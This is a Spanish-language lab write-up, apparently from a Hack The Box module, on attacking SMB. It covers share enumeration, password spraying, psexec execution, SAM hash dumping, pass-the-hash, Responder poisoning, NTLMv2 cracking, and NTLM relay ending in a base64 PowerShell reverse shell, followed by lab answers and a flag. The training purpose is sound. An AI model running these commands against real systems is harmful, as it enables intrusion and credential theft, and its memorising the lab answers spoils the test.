Para enumerar recursos compartidos, podemos utilizar:
```
smbclient -N -L //1.2.3.4
```
o
```
smbmap -H <ip_atacante>
```

Con el comando:
```shell-session
Polika4RM@htb[/htb]$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

Hace que sea de forma recursiva numere todos los archivos del recurso "notes".

Podríamos descargarnos alguno con:
```shell-session
Polika4RM@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

---
### Fuerza bruta

La fuerza bruta consiste en probar muchas contraseñas sobre una misma cuenta hasta encontrar la correcta; es eficaz pero peligroso, porque si se sobrepasa el umbral de intentos fallidos se puede provocar el bloqueo de la cuenta. Por eso, salvo que conozcas exactamente ese umbral y puedas detenerte antes, no se recomienda su uso en entornos reales.

El password spraying invierte la estrategia: en lugar de bombardear una cuenta con muchas contraseñas, se prueba una o pocas contraseñas comunes contra una lista amplia de usuarios. De este modo se minimiza la probabilidad de bloquear cuentas individuales y se mantienen los intentos por cuenta muy bajos. Una práctica habitual y prudente es limitarse a uno o pocos intentos (por ejemplo 1–3) por cuenta y esperar entre 30 y 60 minutos entre oleadas para evitar activar mecanismos de bloqueo. Si conoces la política de bloqueo, puedes ajustar el número de contraseñas intentadas con más precisión.

Herramientas como CrackMapExec facilitan este enfoque a gran escala: permiten suministrar un fichero con usuarios (opción -u) y una contraseña a probar (opción -p) para intentar autenticar a todos los usuarios contra una o varias máquinas. En resumen, cuando se busca acceso sin causar bloqueos ni alertas, el password spraying es la técnica preferible frente a la fuerza bruta, siempre bajo un marco legal y con autorización para hacer pruebas.

```shell-session
Polika4RM@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```


--local-auth le dice a CrackMapExec (CME) que pruebe las credenciales contra las cuentas locales del equipo objetivo (el SAM local) en lugar de intentar autenticación de dominio/Kerberos.

---

### RCE (Remote Code Execution)

PsExec es una herramienta que permite ejecutar procesos en otros sistemas con una interactividad total con aplicaciones de consolas. 

### Impacket PsExec
Podemos utilizar el siguiente comando para conectarnos a un servicio SMB con credenciales:
```shell-session
impacket-psexec administrator:'Password123!'@10.10.110.17
```

### CrackMapExec
Podemos utilizar el comando:
```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

En caso de que estemos en una cuenta administrador y queramos ver que usuarios están conectados en la red, podemos utilizar:
```shell-session
Polika4RM@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser   
```

Podemos extraer Hashes SAM con el comando:
```shell-session
Polika4RM@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
```

---
## Pass-the-Hash (PtH)
Imaginemos que tenemos el Hash de un usuario pero no podemos crackearlo. Podemos utilizar pues la técnica de Pass The Hash para autenticarnos a través del servicio SMB.

```shell-session
Polika4RM@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```

Con esto accedería a la cuenta administrador sin la necesidad de ingresar con la contraseña en texto plano.

---

## Ataques forzados de autenticación
Un ataque forzado de autenticación (authentication forcing / SMB relay / credential capture) abusa de cómo Windows resuelve nombres y cómo confía en respuestas en la red. Objetivo: **hacer que una máquina cliente envíe sus credenciales (hash NTLM) hacia un servidor controlado por el atacante**, y luego **usar ese hash** para autenticarse contra otra máquina objetivo (relay) o intentar descifrar la contraseña offline.

Podemos abusar del protocolo SMB creando un servidor SMB falso, para capturar los NetNTLM v1v2 hashes.

Utilizamos la herramineta "Responder":
>https://github.com/lgandx/Responder


Cuando un usuario o un sistema intenta realizar una Resolución de Nombres (NR), la máquina realiza una serie de procedimientos para recuperar la dirección IP de un host a partir de su nombre de host. En equipos Windows, el procedimiento es básicamente el siguiente:

- Se requiere la dirección IP del recurso compartido de archivos del nombre de host.
- Se comprobará el archivo del host local (C:\Windows\System32\Drivers\etc\hosts) en busca de registros compatibles.
- Si no se encuentran registros, el equipo recurre a la caché DNS local, que registra los nombres resueltos recientemente.
- ¿No hay ningún registro DNS local? Se enviará una consulta al servidor DNS configurado.
- Si todo lo demás falla, el equipo emitirá una consulta de multidifusión solicitando la dirección IP del recurso compartido de archivos a otros equipos de la red.

Supongamos que un usuario escribe incorrectamente el nombre de una carpeta compartida: \\mysharefoder\ en lugar de \\mysharedfolder\. En ese caso, todas las resoluciones de nombre fallarán porque el nombre no existe, y la máquina enviará una consulta de multidifusión a todos los dispositivos de la red, incluido el servidor SMB falso. Esto supone un problema porque no se toman medidas para verificar la integridad de las respuestas. Los atacantes pueden aprovechar este mecanismo escuchando dichas consultas y falsificando las respuestas, lo que induce a la víctima a creer que los servidores maliciosos son confiables. Esta confianza se suele utilizar para robar credenciales.

```shell-session
Polika4RM@htb[/htb]$ sudo responder -I ens33

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
               
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:                
    LLMNR                      [ON]
    NBT-NS                     [ON]        
    DNS/MDNS                   [ON]   
                                                                                                                                                                                          
[+] Servers:         
    HTTP server                [ON]                                   
    HTTPS server               [ON]
    WPAD proxy                 [OFF]                                  
    Auth proxy                 [OFF]
    SMB server                 [ON]                                   
    Kerberos server            [ON]                                   
    SQL server                 [ON]                                   
    FTP server                 [ON]                                   
    IMAP server                [ON]                                   
    POP3 server                [ON]                                   
    SMTP server                [ON]                                   
    DNS server                 [ON]                                   
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]                                   
                                                                                   
[+] HTTP Options:                                                                  
    Always serving EXE         [OFF]                                               
    Serving EXE                [OFF]                                               
    Serving HTML               [OFF]                                               
    Upstream Proxy             [OFF]                                               

[+] Poisoning Options:                                                             
    Analyze Mode               [OFF]                                               
    Force WPAD auth            [OFF]                                               
    Force Basic Auth           [OFF]                                               
    Force LM downgrade         [OFF]                                               
    Fingerprint hosts          [OFF]                                               

[+] Generic Options:                                                               
    Responder NIC              [tun0]                                              
    Responder IP               [10.10.14.198]                                      
    Challenge set              [random]                                            
    Don't Respond To Names     ['ISATAP']                                          

[+] Current Session Variables:                                                     
    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
    Responder Domain Name      [HF2L.LOCAL]                                        
    Responder DCE-RPC Port     [48162] 

[+] Listening for events... 

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
```
Los equipos que se conectan son equipos de la misma red que buscan recursos con una dirección no válida. Cuando un equipo no encuentra un recurso que busca hace un "broadcast" para que alguien responda. Y es ahí cuando nosotros responderemos.w


Con HASHES interceptados, podemos desencriptarlos con:
```shell-session
Polika4RM@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386

ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)
Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 75776/14344386 (0.53%)
Rejected.........: 0/75776 (0.00%)
Restore.Point....: 73728/14344386 (0.51%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: compu -> kodiak1

Started: Mon Apr 11 16:49:34 2022
Stopped: Mon Apr 11 16:49:37 2022
```

Se descifró el hash NTLMv2. La contraseña es P@ssword. Si no podemos descifrarlo, podemos retransmitir el hash capturado a otra máquina usando impacket-ntlmrelayx o Responder MultiRelay.py. Veamos un ejemplo con impacket-ntlmrelayx.

Primero, debemos desactivar SMB en nuestro archivo de configuración de Responder (/etc/responder/Responder.conf).
```
Polika4RM@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Tomo esos HASHES que recibý y en vez de descifrar la contraseña simplemente la renvío a un equipo objetivo que yo elija. Normalmente es un servidor en la red. Pongo --no-http-server para no levantar un servidor http.
```shell-session
Polika4RM@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<SNIP>

[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146
[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Done dumping SAM hashes for host: 10.10.110.146
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

Podemos crear un shell inverso de PowerShell usando https://www.revshells.com/, configurar la dirección IP de nuestra máquina, el puerto y la opción Powershell #3 (Base64):

```shell-session
Polika4RM@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD... ... GUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Una vez que la víctima se autentica en nuestro servidor, envenenamos la respuesta y hacemos que ejecute nuestro comando para obtener un shell inverso.

```shell-session
Polika4RM@htb[/htb]$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```

---

Target(s): 10.129.187.155
**1. What is the name of the shared folder with READ permissions?**
Ejecuto un:
```
smbclient -N -L //10.129.187.155

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	GGJ             Disk      Priv
	IPC$            IPC       IPC Service (attcsvc-linux Samba)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

```

Siendo la respuesta: GGJ

**2. What is the password for the username "jason"?**
Ejecuto:
```
crackmapexec smb 10.129.187.155 -u jason -p password.list --local-auth
```

Y una salida es:
```
SMB         10.129.187.155  445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh 
```

Siendo la respuesta: "34c8zuNBo91!@28Bszh"

**3. Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.**

Veo que en el recurso "GGJ" hay una clave privada:
```
smbmap -H 10.129.187.155 -r "GGJ"
```

```
fr--r--r--             3381 Tue Apr 19 16:33:03 2022	id_rsa
```

Me la descargo con las credenciales obtenidas anteriormente:
```
smbmap -H 10.129.187.155 --download "GGJ\id_rsa" -u jason -p '34c8zuNBo91!@28Bszh'
```
Doy permisos de ejecución:
```
10.129.187.155-GGJ_id_rsa
```
Y entro por SSH a dicho servidor:

```
ssh jason@10.129.187.155 -i 10.129.187.155-GGJ_id_rsa 
```

Y capturo el flag.txt:
HTB{SMB_4TT4CKS_2349872359}


